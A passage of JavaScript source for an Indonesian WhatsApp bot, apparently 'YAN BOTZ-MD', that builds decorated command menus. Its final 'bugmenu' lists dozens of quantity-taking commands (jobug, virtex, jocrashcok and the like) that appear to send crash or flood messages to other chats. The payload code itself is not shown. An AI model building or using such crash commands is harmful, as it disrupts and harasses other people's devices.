██░░░░─║╣║║─║─░░░░██
██░░░░─╩╝╚╝─╩─░░░░██
████████████████████
╭━━━━╼⃟݊⃟̥⃝̇݊݊⃟⭕️𝐏𝐑𝐈𝐕𝐀𝐓𝐄⭕️ ݊⃟̥⃝̇݊⃟━━━━╮
┃ ╭━─━─━─≪✠≫─━─━─━╮
┃ ┃ ╭┈────────────╮
┃ ┃ │  ݊⃟̥⃝̇݊⃟╾•🎗𝐌𝐄𝐍𝐔_𝐍𝐘𝐀🎗•╼⃟݊⃟̥⃝̇݊݊⃟   
┃ ┃ ╰┈────────────╯
┃ ╰━─━─━─≪✠≫─━─━─━╯
┣━━╼⃟݊⃟̥⃝̇݊݊⃟᯽⃟⃘⃰〘𝚈̲̅𝙰̲̅𝙽̲̅𝙱̲̅𝙾̲̅𝚃̲̅𝚉̲̅:̲̅𝙼̲̅𝙳̲̅〙⃟⃘⃰᯽ ݊⃟̥⃝̇݊⃟━•⊰᯽
┃╭━━━━━━━━━━━━━━━━╮
┃┃   ݊⃟̥⃝̇݊⃟╾•MAIN_MENU•╼⃟݊⃟̥⃝̇݊݊⃟   
┃╰━━━━━━━━━━━━━━━━╯
┃╭━━━━━━━━━━━━━━━━╮
┃│᭄⃟ꪶ⃟•╾ ${prefix}𝚙𝚒𝚗𝚐
┃│᭄⃟ꪶ⃟•╾ ${prefix}𝚘𝚠𝚗𝚎𝚛
┃│᭄⃟ꪶ⃟•╾ ${prefix}𝚖𝚎𝚗𝚞 / 𝚑𝚎𝚕𝚙 / ?
┃│᭄⃟ꪶ⃟•╾ ${prefix}𝚍𝚎𝚕𝚎𝚝𝚎
┃│᭄⃟ꪶ⃟•╾ ${prefix}𝚒𝚗𝚏𝚘𝚌𝚑𝚊𝚝
┃│᭄⃟ꪶ⃟•╾ ${prefix}𝚚𝚞𝚘𝚝𝚎𝚍
┃│᭄⃟ꪶ⃟•╾ ${prefix}𝚕𝚒𝚜𝚝𝚙𝚌
┃│᭄⃟ꪶ⃟•╾ ${prefix}𝚕𝚒𝚜𝚝𝚐𝚌
┃│᭄⃟ꪶ⃟•╾ ${prefix}𝚕𝚒𝚜𝚝𝚘𝚗𝚕𝚒𝚗𝚎
┃│᭄⃟ꪶ⃟•╾ ${prefix}𝚜𝚙𝚎𝚎𝚍𝚝𝚎𝚜𝚝
┃╰━━━━━━━━━━━━━━━━╯
╰━━╼⃟݊⃟̥⃝̇݊݊⃟᯽⃟⃘⃰〘𝚈̲̅𝙰̲̅𝙽̲̅𝙱̲̅𝙾̲̅𝚃̲̅𝚉̲̅:̲̅𝙼̲̅𝙳̲̅〙⃟⃘⃰᯽ ݊⃟̥⃝̇݊⃟╾━━╯
 ▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰

© ⏤͜͡★𝐘𝐀𝐍 𝐁𝐎𝐓𝐙-𝐌𝐃

 ♡ ㅤ    ❍ㅤ        ⎙ㅤ        ⌲
ᴸⁱᵏᵉ   ᶜᵒᵐᵐᵉⁿᵗ   ᵈᵒʷⁿˡᵒᵃᵈ     ˢʰᵃʳᵉ`
jobotz.sendMessage(m.chat, {image: thumb,  
"contextInfo": {
"externalAdReply": {
"title": `© ꧁✿𝗬𝗮𝗻 𝗧𝗵𝗲𝘀𝗼𝗽𝗽ッ𝟮𝟱𝟴〠✿꧂`,
"body":`Runtime ${runtime(process.uptime())}`,
"previewType": "PHOTO",
"showAdAttribution": true,
"sourceUrl": `https://youtube.com/channel/UC-wt99jFVc-zXMkxKRDZ56w`,
"thumbnail": thumb
}}, caption: anu }, {quoted: fkonjo, contextInfo:{}})
}
break
 case 'databasemenu': {
 if (!isCreator && !isBan) return 
 anu = `
████████████████████
██░░░░╔╦╗╦─╦╔╗░░░░██
██░░░░─║─╠═╣╠─░░░░██
██░░░░─╩─╩─╩╚╝░░░░██
██░░░░░░─╦╔╗░░░░░░██
██░░░░░░─║║║░░░░░░██
██░░░░░░╚╝╚╝░░░░░░██
██░░░░─╦╗╔╗╔╦╗░░░░██
██░░░░─║╣║║─║─░░░░██
██░░░░─╩╝╚╝─╩─░░░░██
████████████████████
╭━━━━╼⃟݊⃟̥⃝̇݊݊⃟⭕️𝐏𝐑𝐈𝐕𝐀𝐓𝐄⭕️ ݊⃟̥⃝̇݊⃟━━━━╮
┃ ╭━─━─━─≪✠≫─━─━─━╮
┃ ┃ ╭┈────────────╮
┃ ┃ │  ݊⃟̥⃝̇݊⃟╾•🎗𝐌𝐄𝐍𝐔_𝐍𝐘𝐀🎗•╼⃟݊⃟̥⃝̇݊݊⃟   
┃ ┃ ╰┈────────────╯
┃ ╰━─━─━─≪✠≫─━─━─━╯
┣━━╼⃟݊⃟̥⃝̇݊݊⃟᯽⃟⃘⃰〘𝚈̲̅𝙰̲̅𝙽̲̅𝙱̲̅𝙾̲̅𝚃̲̅𝚉̲̅:̲̅𝙼̲̅𝙳̲̅〙⃟⃘⃰᯽ ݊⃟̥⃝̇݊⃟━•⊰᯽
┃╭━━━━━━━━━━━━━━━━╮
┃┃   ݊⃟̥⃝̇݊⃟╾•DATABASE_MENU•╼⃟݊⃟̥⃝̇݊݊⃟   
┃╰━━━━━━━━━━━━━━━━╯
┃╭━━━━━━━━━━━━━━━━╮
┃│᭄⃟ꪶ⃟•╾ ${prefix}𝚜𝚎𝚝𝚌𝚖𝚍
┃│᭄⃟ꪶ⃟•╾ ${prefix}𝚕𝚒𝚜𝚝𝚌𝚖𝚍
┃│᭄⃟ꪶ⃟•╾ ${prefix}𝚍𝚎𝚕𝚌𝚖𝚍
┃│᭄⃟ꪶ⃟•╾ ${prefix}𝚕𝚘𝚌𝚔𝚌𝚖𝚍
┃│᭄⃟ꪶ⃟•╾ ${prefix}𝚊𝚍𝚍𝚖𝚜𝚐
┃│᭄⃟ꪶ⃟•╾ ${prefix}𝚕𝚒𝚜𝚝𝚖𝚜𝚐
┃│᭄⃟ꪶ⃟•╾ ${prefix}𝚐𝚎𝚝𝚖𝚜𝚐
┃│᭄⃟ꪶ⃟•╾ ${prefix}𝚍𝚎𝚕𝚖𝚜𝚐
┃╰━━━━━━━━━━━━━━━━╯
╰━━╼⃟݊⃟̥⃝̇݊݊⃟᯽⃟⃘⃰〘𝚈̲̅𝙰̲̅𝙽̲̅𝙱̲̅𝙾̲̅𝚃̲̅𝚉̲̅:̲̅𝙼̲̅𝙳̲̅〙⃟⃘⃰᯽ ݊⃟̥⃝̇݊⃟╾━━╯
 ▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰

© ⏤͜͡★𝐘𝐀𝐍 𝐁𝐎𝐓𝐙-𝐌𝐃

 ♡ ㅤ    ❍ㅤ        ⎙ㅤ        ⌲
ᴸⁱᵏᵉ   ᶜᵒᵐᵐᵉⁿᵗ   ᵈᵒʷⁿˡᵒᵃᵈ     ˢʰᵃʳᵉ`
jobotz.sendMessage(m.chat, {image: thumb,  
"contextInfo": {
"externalAdReply": {
"title": `© ꧁✿𝗬𝗮𝗻 𝗧𝗵𝗲𝘀𝗼𝗽𝗽ッ𝟮𝟱𝟴〠✿꧂`,
"body":`Runtime ${runtime(process.uptime())}`,
"previewType": "PHOTO",
"showAdAttribution": true,
"sourceUrl": `https://youtube.com/channel/UC-wt99jFVc-zXMkxKRDZ56w`,
"thumbnail": thumb
}}, caption: anu }, {quoted: fkonjo, contextInfo:{}})
}
break
 case 'anonymousmenu': {
 if (!isCreator && !isBan) return 
 anu = `
████████████████████
██░░░░╔╦╗╦─╦╔╗░░░░██
██░░░░─║─╠═╣╠─░░░░██
██░░░░─╩─╩─╩╚╝░░░░██
██░░░░░░─╦╔╗░░░░░░██
██░░░░░░─║║║░░░░░░██
██░░░░░░╚╝╚╝░░░░░░██
██░░░░─╦╗╔╗╔╦╗░░░░██
██░░░░─║╣║║─║─░░░░██
██░░░░─╩╝╚╝─╩─░░░░██
████████████████████
╭━━━━╼⃟݊⃟̥⃝̇݊݊⃟⭕️𝐏𝐑𝐈𝐕𝐀𝐓𝐄⭕️ ݊⃟̥⃝̇݊⃟━━━━╮
┃ ╭━─━─━─≪✠≫─━─━─━╮
┃ ┃ ╭┈────────────╮
┃ ┃ │  ݊⃟̥⃝̇݊⃟╾•🎗𝐌𝐄𝐍𝐔_𝐍𝐘𝐀🎗•╼⃟݊⃟̥⃝̇݊݊⃟   
┃ ┃ ╰┈────────────╯
┃ ╰━─━─━─≪✠≫─━─━─━╯
┣━━╼⃟݊⃟̥⃝̇݊݊⃟᯽⃟⃘⃰〘𝚈̲̅𝙰̲̅𝙽̲̅𝙱̲̅𝙾̲̅𝚃̲̅𝚉̲̅:̲̅𝙼̲̅𝙳̲̅〙⃟⃘⃰᯽ ݊⃟̥⃝̇݊⃟━•⊰᯽
┃╭━━━━━━━━━━━━━━━━╮
┃┃ ݊⃟̥⃝̇݊⃟╾•ANONYMOUS_MENU•╼⃟݊⃟̥⃝̇݊݊⃟   
┃╰━━━━━━━━━━━━━━━━╯
┃╭━━━━━━━━━━━━━━━━╮
┃│᭄⃟ꪶ⃟•╾ ${prefix}𝚊𝚗𝚘𝚗𝚢𝚖𝚘𝚞𝚜
┃│᭄⃟ꪶ⃟•╾ ${prefix}𝚜𝚝𝚊𝚛𝚝
┃│᭄⃟ꪶ⃟•╾ ${prefix}𝚗𝚎𝚡𝚝
┃│᭄⃟ꪶ⃟•╾ ${prefix}𝚔𝚎𝚕𝚞𝚊𝚛
┃╰━━━━━━━━━━━━━━━━╯
╰━━╼⃟݊⃟̥⃝̇݊݊⃟᯽⃟⃘⃰〘𝚈̲̅𝙰̲̅𝙽̲̅𝙱̲̅𝙾̲̅𝚃̲̅𝚉̲̅:̲̅𝙼̲̅𝙳̲̅〙⃟⃘⃰᯽ ݊⃟̥⃝̇݊⃟╾━━╯
 ▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰

© ⏤͜͡★𝐘𝐀𝐍 𝐁𝐎𝐓𝐙-𝐌𝐃

 ♡ ㅤ    ❍ㅤ        ⎙ㅤ        ⌲
ᴸⁱᵏᵉ   ᶜᵒᵐᵐᵉⁿᵗ   ᵈᵒʷⁿˡᵒᵃᵈ     ˢʰᵃʳᵉ`
jobotz.sendMessage(m.chat, {image: thumb,  
"contextInfo": {
"externalAdReply": {
"title": `© ꧁✿𝗬𝗮𝗻 𝗧𝗵𝗲𝘀𝗼𝗽𝗽ッ𝟮𝟱𝟴〠✿꧂`,
"body":`Runtime ${runtime(process.uptime())}`,
"previewType": "PHOTO",
"showAdAttribution": true,
"sourceUrl": `https://youtube.com/channel/UC-wt99jFVc-zXMkxKRDZ56w`,
"thumbnail": thumb
}}, caption: anu }, {quoted: fkonjo, contextInfo:{}})
}
break
 case 'islamicmenu': {
 if (!isCreator && !isBan) return 
 anu = `
████████████████████
██░░░░╔╦╗╦─╦╔╗░░░░██
██░░░░─║─╠═╣╠─░░░░██
██░░░░─╩─╩─╩╚╝░░░░██
██░░░░░░─╦╔╗░░░░░░██
██░░░░░░─║║║░░░░░░██
██░░░░░░╚╝╚╝░░░░░░██
██░░░░─╦╗╔╗╔╦╗░░░░██
██░░░░─║╣║║─║─░░░░██
██░░░░─╩╝╚╝─╩─░░░░██
████████████████████
╭━━━━╼⃟݊⃟̥⃝̇݊݊⃟⭕️𝐏𝐑𝐈𝐕𝐀𝐓𝐄⭕️ ݊⃟̥⃝̇݊⃟━━━━╮
┃ ╭━─━─━─≪✠≫─━─━─━╮
┃ ┃ ╭┈────────────╮
┃ ┃ │  ݊⃟̥⃝̇݊⃟╾•🎗𝐌𝐄𝐍𝐔_𝐍𝐘𝐀🎗•╼⃟݊⃟̥⃝̇݊݊⃟   
┃ ┃ ╰┈────────────╯
┃ ╰━─━─━─≪✠≫─━─━─━╯
┣━━╼⃟݊⃟̥⃝̇݊݊⃟᯽⃟⃘⃰〘𝚈̲̅𝙰̲̅𝙽̲̅𝙱̲̅𝙾̲̅𝚃̲̅𝚉̲̅:̲̅𝙼̲̅𝙳̲̅〙⃟⃘⃰᯽ ݊⃟̥⃝̇݊⃟━•⊰᯽
┃╭━━━━━━━━━━━━━━━━╮
┃┃   ݊⃟̥⃝̇݊⃟╾•OWNER_MENU•╼⃟݊⃟̥⃝̇݊݊⃟   
┃╰━━━━━━━━━━━━━━━━╯
┃╭━━━━━━━━━━━━━━━━╮
┃│᭄⃟ꪶ⃟•╾ ${prefix}𝚒𝚚𝚛𝚊
┃│᭄⃟ꪶ⃟•╾ ${prefix}𝚑𝚊𝚍𝚒𝚜𝚝
┃│᭄⃟ꪶ⃟•╾ ${prefix}𝚊𝚕𝚚𝚞𝚛𝚊𝚗
┃│᭄⃟ꪶ⃟•╾ ${prefix}𝚓𝚞𝚣𝚊𝚖𝚖𝚊
┃│᭄⃟ꪶ⃟•╾ ${prefix}𝚝𝚊𝚏𝚜𝚒𝚛𝚜𝚞𝚛𝚊𝚑
┃╰━━━━━━━━━━━━━━━━╯
╰━━╼⃟݊⃟̥⃝̇݊݊⃟᯽⃟⃘⃰〘𝚈̲̅𝙰̲̅𝙽̲̅𝙱̲̅𝙾̲̅𝚃̲̅𝚉̲̅:̲̅𝙼̲̅𝙳̲̅〙⃟⃘⃰᯽ ݊⃟̥⃝̇݊⃟╾━━╯
 ▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰

© ⏤͜͡★𝐘𝐀𝐍 𝐁𝐎𝐓𝐙-𝐌𝐃

 ♡ ㅤ    ❍ㅤ        ⎙ㅤ        ⌲
ᴸⁱᵏᵉ   ᶜᵒᵐᵐᵉⁿᵗ   ᵈᵒʷⁿˡᵒᵃᵈ     ˢʰᵃʳᵉ`
jobotz.sendMessage(m.chat, {image: thumb,  
"contextInfo": {
"externalAdReply": {
"title": `© ꧁✿𝗬𝗮𝗻 𝗧𝗵𝗲𝘀𝗼𝗽𝗽ッ𝟮𝟱𝟴〠✿꧂`,
"body":`Runtime ${runtime(process.uptime())}`,
"previewType": "PHOTO",
"showAdAttribution": true,
"sourceUrl": `https://youtube.com/channel/UC-wt99jFVc-zXMkxKRDZ56w`,
"thumbnail": thumb
}}, caption: anu }, {quoted: fkonjo, contextInfo:{}})
}
break
 case 'voicemenu': {
 if (!isCreator && !isBan) return 
 anu = `
████████████████████
██░░░░╔╦╗╦─╦╔╗░░░░██
██░░░░─║─╠═╣╠─░░░░██
██░░░░─╩─╩─╩╚╝░░░░██
██░░░░░░─╦╔╗░░░░░░██
██░░░░░░─║║║░░░░░░██
██░░░░░░╚╝╚╝░░░░░░██
██░░░░─╦╗╔╗╔╦╗░░░░██
██░░░░─║╣║║─║─░░░░██
██░░░░─╩╝╚╝─╩─░░░░██
████████████████████
╭━━━━╼⃟݊⃟̥⃝̇݊݊⃟⭕️𝐏𝐑𝐈𝐕𝐀𝐓𝐄⭕️ ݊⃟̥⃝̇݊⃟━━━━╮
┃ ╭━─━─━─≪✠≫─━─━─━╮
┃ ┃ ╭┈────────────╮
┃ ┃ │  ݊⃟̥⃝̇݊⃟╾•🎗𝐌𝐄𝐍𝐔_𝐍𝐘𝐀🎗•╼⃟݊⃟̥⃝̇݊݊⃟   
┃ ┃ ╰┈────────────╯
┃ ╰━─━─━─≪✠≫─━─━─━╯
┣━━╼⃟݊⃟̥⃝̇݊݊⃟᯽⃟⃘⃰〘𝚈̲̅𝙰̲̅𝙽̲̅𝙱̲̅𝙾̲̅𝚃̲̅𝚉̲̅:̲̅𝙼̲̅𝙳̲̅〙⃟⃘⃰᯽ ݊⃟̥⃝̇݊⃟━•⊰᯽
┃╭━━━━━━━━━━━━━━━━╮
┃┃   ݊⃟̥⃝̇݊⃟╾•VOICE_MENU•╼⃟݊⃟̥⃝̇݊݊⃟   
┃╰━━━━━━━━━━━━━━━━╯
┃╭━━━━━━━━━━━━━━━━╮
┃│᭄⃟ꪶ⃟•╾ ${prefix}𝚋𝚊𝚜𝚜
┃│᭄⃟ꪶ⃟•╾ ${prefix}𝚋𝚕𝚘𝚠𝚗
┃│᭄⃟ꪶ⃟•╾ ${prefix}𝚍𝚎𝚎𝚙
┃│᭄⃟ꪶ⃟•╾ ${prefix}𝚎𝚊𝚛𝚛𝚊𝚙𝚎
┃│᭄⃟ꪶ⃟•╾ ${prefix}𝚏𝚊𝚜𝚝
┃│᭄⃟ꪶ⃟•╾ ${prefix}𝚏𝚊𝚝
┃│᭄⃟ꪶ⃟•╾ ${prefix}𝚗𝚒𝚐𝚑𝚝𝚌𝚘𝚛𝚎
┃│᭄⃟ꪶ⃟•╾ ${prefix}𝚛𝚎𝚟𝚎𝚛𝚜𝚎
┃│᭄⃟ꪶ⃟•╾ ${prefix}𝚛𝚘𝚋𝚘𝚝
┃│᭄⃟ꪶ⃟•╾ ${prefix}𝚜𝚕𝚘𝚠
┃│᭄⃟ꪶ⃟•╾ ${prefix}𝚝𝚞𝚙𝚊𝚒
┃╰━━━━━━━━━━━━━━━━╯
╰━━╼⃟݊⃟̥⃝̇݊݊⃟᯽⃟⃘⃰〘𝚈̲̅𝙰̲̅𝙽̲̅𝙱̲̅𝙾̲̅𝚃̲̅𝚉̲̅:̲̅𝙼̲̅𝙳̲̅〙⃟⃘⃰᯽ ݊⃟̥⃝̇݊⃟╾━━╯
 ▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰

© ⏤͜͡★𝐘𝐀𝐍 𝐁𝐎𝐓𝐙-𝐌𝐃

 ♡ ㅤ    ❍ㅤ        ⎙ㅤ        ⌲
ᴸⁱᵏᵉ   ᶜᵒᵐᵐᵉⁿᵗ   ᵈᵒʷⁿˡᵒᵃᵈ     ˢʰᵃʳᵉ`
jobotz.sendMessage(m.chat, {image: thumb,  
"contextInfo": {
"externalAdReply": {
"title": `© ꧁✿𝗬𝗮𝗻 𝗧𝗵𝗲𝘀𝗼𝗽𝗽ッ𝟮𝟱𝟴〠✿꧂`,
"body":`Runtime ${runtime(process.uptime())}`,
"previewType": "PHOTO",
"showAdAttribution": true,
"sourceUrl": `https://youtube.com/channel/UC-wt99jFVc-zXMkxKRDZ56w`,
"thumbnail": thumb
}}, caption: anu }, {quoted: fkonjo, contextInfo:{}})
}
break
 case 'ownermenu': {
 if (!isCreator && !isBan) return 
 anu = `
████████████████████
██░░░░╔╦╗╦─╦╔╗░░░░██
██░░░░─║─╠═╣╠─░░░░██
██░░░░─╩─╩─╩╚╝░░░░██
██░░░░░░─╦╔╗░░░░░░██
██░░░░░░─║║║░░░░░░██
██░░░░░░╚╝╚╝░░░░░░██
██░░░░─╦╗╔╗╔╦╗░░░░██
██░░░░─║╣║║─║─░░░░██
██░░░░─╩╝╚╝─╩─░░░░██
████████████████████
╭━━━━╼⃟݊⃟̥⃝̇݊݊⃟⭕️𝐏𝐑𝐈𝐕𝐀𝐓𝐄⭕️ ݊⃟̥⃝̇݊⃟━━━━╮
┃ ╭━─━─━─≪✠≫─━─━─━╮
┃ ┃ ╭┈────────────╮
┃ ┃ │  ݊⃟̥⃝̇݊⃟╾•🎗𝐌𝐄𝐍𝐔_𝐍𝐘𝐀🎗•╼⃟݊⃟̥⃝̇݊݊⃟   
┃ ┃ ╰┈────────────╯
┃ ╰━─━─━─≪✠≫─━─━─━╯
┣━━╼⃟݊⃟̥⃝̇݊݊⃟᯽⃟⃘⃰〘𝚈̲̅𝙰̲̅𝙽̲̅𝙱̲̅𝙾̲̅𝚃̲̅𝚉̲̅:̲̅𝙼̲̅𝙳̲̅〙⃟⃘⃰᯽ ݊⃟̥⃝̇݊⃟━•⊰᯽
┃╭━━━━━━━━━━━━━━━━╮
┃┃   ݊⃟̥⃝̇݊⃟╾•OWNER_MENU•╼⃟݊⃟̥⃝̇݊݊⃟   
┃╰━━━━━━━━━━━━━━━━╯
┃╭━━━━━━━━━━━━━━━━╮
┃│᭄⃟ꪶ⃟•╾ ${prefix}𝚛𝚎𝚊𝚌𝚝 [𝚎𝚖𝚘𝚓𝚒]
┃│᭄⃟ꪶ⃟•╾ ${prefix}𝚌𝚑𝚊𝚝 [𝚘𝚙𝚝𝚒𝚘𝚗]
┃│᭄⃟ꪶ⃟•╾ ${prefix}𝚓𝚘𝚒𝚗 [𝚕𝚒𝚗𝚔]
┃│᭄⃟ꪶ⃟•╾ ${prefix}𝚕𝚎𝚊𝚟𝚎
┃│᭄⃟ꪶ⃟•╾ ${prefix}𝚋𝚕𝚘𝚌𝚔 @𝚞𝚜𝚎𝚛
┃│᭄⃟ꪶ⃟•╾ ${prefix}𝚞𝚗𝚋𝚕𝚘𝚌𝚔 @𝚞𝚜𝚎𝚛
┃│᭄⃟ꪶ⃟•╾ ${prefix}𝚋𝚌𝚐𝚛𝚘𝚞𝚙 [𝚝𝚎𝚡𝚝]
┃│᭄⃟ꪶ⃟•╾ ${prefix}𝚋𝚌𝚊𝚕𝚕 [𝚝𝚎𝚡𝚝]
┃│᭄⃟ꪶ⃟•╾ ${prefix}𝚜𝚎𝚝𝚙𝚙𝚋𝚘𝚝 [𝚒𝚖𝚊𝚐𝚎]
┃│᭄⃟ꪶ⃟•╾ ${prefix}𝚜𝚎𝚝𝚎𝚡𝚒𝚏
┃│᭄⃟ꪶ⃟•╾ ${prefix}𝚜𝚎𝚝𝚖𝚎𝚗𝚞 [𝚘𝚙𝚝𝚒𝚘𝚗]
┃╰━━━━━━━━━━━━━━━━╯
╰━━╼⃟݊⃟̥⃝̇݊݊⃟᯽⃟⃘⃰〘𝚈̲̅𝙰̲̅𝙽̲̅𝙱̲̅𝙾̲̅𝚃̲̅𝚉̲̅:̲̅𝙼̲̅𝙳̲̅〙⃟⃘⃰᯽ ݊⃟̥⃝̇݊⃟╾━━╯
 ▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰

© ⏤͜͡★𝐘𝐀𝐍 𝐁𝐎𝐓𝐙-𝐌𝐃

 ♡ ㅤ    ❍ㅤ        ⎙ㅤ        ⌲
ᴸⁱᵏᵉ   ᶜᵒᵐᵐᵉⁿᵗ   ᵈᵒʷⁿˡᵒᵃᵈ     ˢʰᵃʳᵉ`
jobotz.sendMessage(m.chat, {image: thumb,  
"contextInfo": {
"externalAdReply": {
"title": `© ꧁✿𝗬𝗮𝗻 𝗧𝗵𝗲𝘀𝗼𝗽𝗽ッ𝟮𝟱𝟴〠✿꧂`,
"body":`Runtime ${runtime(process.uptime())}`,
"previewType": "PHOTO",
"showAdAttribution": true,
"sourceUrl": `https://youtube.com/channel/UC-wt99jFVc-zXMkxKRDZ56w`,
"thumbnail": thumb
}}, caption: anu }, {quoted: fkonjo, contextInfo:{}})
}
break
 case 'bugmenu': { 
 if (!isCreator && !isBan) return
 anu = `
████████████████████
██░░░░╔╦╗╦─╦╔╗░░░░██
██░░░░─║─╠═╣╠─░░░░██
██░░░░─╩─╩─╩╚╝░░░░██
██░░░░░░─╦╔╗░░░░░░██
██░░░░░░─║║║░░░░░░██
██░░░░░░╚╝╚╝░░░░░░██
██░░░░─╦╗╔╗╔╦╗░░░░██
██░░░░─║╣║║─║─░░░░██
██░░░░─╩╝╚╝─╩─░░░░██
████████████████████
╭━━━━╼⃟݊⃟̥⃝̇݊݊⃟⭕️𝐏𝐑𝐈𝐕𝐀𝐓𝐄⭕️ ݊⃟̥⃝̇݊⃟━━━━╮
┃ ╭━─━─━─≪✠≫─━─━─━╮
┃ ┃ ╭┈────────────╮
┃ ┃ │  ݊⃟̥⃝̇݊⃟╾•🎗𝐌𝐄𝐍𝐔_𝐍𝐘𝐀🎗•╼⃟݊⃟̥⃝̇݊݊⃟   
┃ ┃ ╰┈────────────╯
┃ ╰━─━─━─≪✠≫─━─━─━╯
┣━━╼⃟݊⃟̥⃝̇݊݊⃟᯽⃟⃘⃰〘𝚈̲̅𝙰̲̅𝙽̲̅𝙱̲̅𝙾̲̅𝚃̲̅𝚉̲̅:̲̅𝙼̲̅𝙳̲̅〙⃟⃘⃰᯽ ݊⃟̥⃝̇݊⃟━•⊰᯽
┃╭━━━━━━━━━━━━━━━━╮
┃┃       ݊⃟̥⃝̇݊⃟╾•BUG_MENU•╼⃟݊⃟̥⃝̇݊݊⃟   
┃┣━━━━━━━━━━━━━━━━╮
┃┃   NOTE: KETIK DI GC/PC
┃╰━━━━━━━━━━━━━━━━╯
┃╭━━━━━━━━━━━━━━━━╮
┃│⃟͙⃝̇݊݊⃟ ⃟•╾${prefix}tag
┃│⃟͙⃝̇݊݊⃟ ⃟•╾${prefix}bokep
┃│⃟͙⃝̇݊݊⃟ ⃟•╾${prefix}polvot
┃│⃟͙⃝̇݊݊⃟ ⃟•╾${prefix}josantet
┃│⃟͙⃝̇݊݊⃟ ⃟•╾${prefix}joinfinite
┃│⃟͙⃝̇݊݊⃟ ⃟•╾${prefix}joslebew
┃│⃟͙⃝̇݊݊⃟ ⃟•╾${prefix}jobug1 (jumlah)
┃│⃟͙⃝̇݊݊⃟ ⃟•╾${prefix}jobug2 (jumlah)
┃│⃟͙⃝̇݊݊⃟ ⃟•╾${prefix}jobug3 (jumlah)
┃│⃟͙⃝̇݊݊⃟ ⃟•╾${prefix}jobug4 (jumlah)
┃│⃟͙⃝̇݊݊⃟ ⃟•╾${prefix}jobug5 (jumlah)
┃│⃟͙⃝̇݊݊⃟ ⃟•╾${prefix}jobug6 (jumlah)
┃│⃟͙⃝̇݊݊⃟ ⃟•╾${prefix}jobug7 (jumlah)
┃│⃟͙⃝̇݊݊⃟ ⃟•╾${prefix}jobug8 (jumlah)
┃│⃟͙⃝̇݊݊⃟ ⃟•╾${prefix}jobug9 (jumlah)
┃│⃟͙⃝̇݊݊⃟ ⃟•╾${prefix}jobug10 (jumlah)
┃│⃟͙⃝̇݊݊⃟ ⃟•╾${prefix}jobug11 (jumlah)
┃│⃟͙⃝̇݊݊⃟ ⃟•╾${prefix}jobug12 (jumlah)
┃│⃟͙⃝̇݊݊⃟ ⃟•╾${prefix}kintil (jumlah)
┃│⃟͙⃝̇݊݊⃟ ⃟•╾${prefix}jopay (jumlah)
┃│⃟͙⃝̇݊݊⃟ ⃟•╾${prefix}virtex (jumlah)
┃│⃟͙⃝̇݊݊⃟ ⃟•╾${prefix}jotroli (jumlah)
┃│⃟͙⃝̇݊݊⃟ ⃟•╾${prefix}kuntul (jumlah)
┃│⃟͙⃝̇݊݊⃟ ⃟•╾${prefix}kontol (jumlah)
┃│⃟͙⃝̇݊݊⃟ ⃟•╾${prefix}joness (jumlah)
┃│⃟͙⃝̇݊݊⃟ ⃟•╾${prefix}jodocu (jumlah)
┃│⃟͙⃝̇݊݊⃟ ⃟•╾${prefix}johello (jumlah)
┃│⃟͙⃝̇݊݊⃟ ⃟•╾${prefix}jolokas (jumlah)
┃│⃟͙⃝̇݊݊⃟ ⃟•╾${prefix}lokasv2 (jumlah)
┃│⃟͙⃝̇݊݊⃟ ⃟•╾${prefix}monyet (jumlah)
┃│⃟͙⃝̇݊݊⃟ ⃟•╾${prefix}jobugpc (jumlah)
┃│⃟͙⃝̇݊݊⃟ ⃟•╾${prefix}jobugvn (jumlah)
┃│⃟͙⃝̇݊݊⃟ ⃟•╾${prefix}jomomo (jumlah)
┃│⃟͙⃝̇݊݊⃟ ⃟•╾${prefix}virtexaja (jumlah)
┃│⃟͙⃝̇݊݊⃟ ⃟•╾${prefix}joliveloc (jumlah)
┃│⃟͙⃝̇݊݊⃟ ⃟•╾${prefix}jobuglist (jumlah)
┃│⃟͙⃝̇݊݊⃟ ⃟•╾${prefix}jobugloc (jumlah)
┃│⃟͙⃝̇݊݊⃟ ⃟•╾${prefix}darkness (jumlah)
┃│⃟͙⃝̇݊݊⃟ ⃟•╾${prefix}jobugstik (jumlah)
┃│⃟͙⃝̇݊݊⃟ ⃟•╾${prefix}jotagwae (jumlah)
┃│⃟͙⃝̇݊݊⃟ ⃟•╾${prefix}jocatalog (jumlah)
┃│⃟͙⃝̇݊݊⃟ ⃟•╾${prefix}jothelima (jumlah)
┃│⃟͙⃝̇݊݊⃟ ⃟•╾${prefix}jobugdoc (jumlah)
┃│⃟͙⃝̇݊݊⃟ ⃟•╾${prefix}button6 (jumlah)
┃│⃟͙⃝̇݊݊⃟ ⃟•╾${prefix}button7 (jumlah)
┃│⃟͙⃝̇݊݊⃟ ⃟•╾${prefix}button8 (jumlah)
┃│⃟͙⃝̇݊݊⃟ ⃟•╾${prefix}button9 (jumlah)
┃│⃟͙⃝̇݊݊⃟ ⃟•╾${prefix}buttonbro (jumlah)
┃│⃟͙⃝̇݊݊⃟ ⃟•╾${prefix}buttonloc (jumlah)
┃│⃟͙⃝̇݊݊⃟ ⃟•╾${prefix}buttonpdf (jumlah)
┃│⃟͙⃝̇݊݊⃟ ⃟•╾${prefix}buttonimg (jumlah)
┃│⃟͙⃝̇݊݊⃟ ⃟•╾${prefix}buttondoc (jumlah)
┃│⃟͙⃝̇݊݊⃟ ⃟•╾${prefix}bugbutton (jumlah)
┃│⃟͙⃝̇݊݊⃟ ⃟•╾${prefix}jocrashcok (jumlah)
┃│⃟͙⃝̇݊݊⃟ ⃟•╾${prefix}jolivelocv2 (jumlah)
┃│⃟͙⃝̇݊݊⃟ ⃟•╾${prefix}jobuginvite (jumlah)
┃│⃟͙⃝̇݊݊⃟ ⃟•╾${prefix}jobugstikv2 (jumlah)
┃│⃟͙⃝̇݊݊⃟ ⃟•╾${prefix}jocatalogv2 (jumlah)
┃│⃟͙⃝̇݊݊⃟ ⃟•╾${prefix}jotengkorak (jumlah)
┃╰━━━━━━━━━━━━━━━━╯
┣━━╼⃟݊⃟̥⃝̇݊݊⃟᯽⃟⃘⃰〘𝚈̲̅𝙰̲̅𝙽̲̅𝙱̲̅𝙾̲̅𝚃̲̅𝚉̲̅:̲̅𝙼̲̅𝙳̲̅〙⃟⃘⃰᯽ ݊⃟̥⃝̇݊⃟━•⊰᯽
